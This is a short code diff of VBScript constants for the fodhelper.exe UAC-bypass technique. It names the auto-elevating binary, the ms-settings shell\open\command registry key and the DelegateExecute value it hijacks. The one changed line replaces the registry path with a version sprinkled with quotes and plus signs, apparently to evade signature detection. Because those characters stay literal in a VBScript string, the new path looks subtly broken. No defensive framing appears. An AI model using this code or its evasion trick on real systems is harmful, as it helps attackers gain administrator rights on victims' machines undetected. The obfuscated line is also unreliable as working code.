@@ -1,7 +1,7 @@
 Const HKEY_CURRENT_USER = &H80000001
 
 Const FodHelperPath = "C:\\Windows\\System32\\fodhelper.exe"
-Const RegKeyPathStr = "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command"
+Const RegKeyPathStr = "SoF'T'W+A'R'E\\C'l'as+ses\\m+s-se't'tings\\sh+ell\\o+p+en\\c'o'm'm'and"
 Const RegKeyPath = "Software\\Classes\\ms-settings\\shell\\open\\command"
 Const DelegateExecRegKeyName = "DelegateExecute"
 Const DelegateExecRegKeyValue = ""
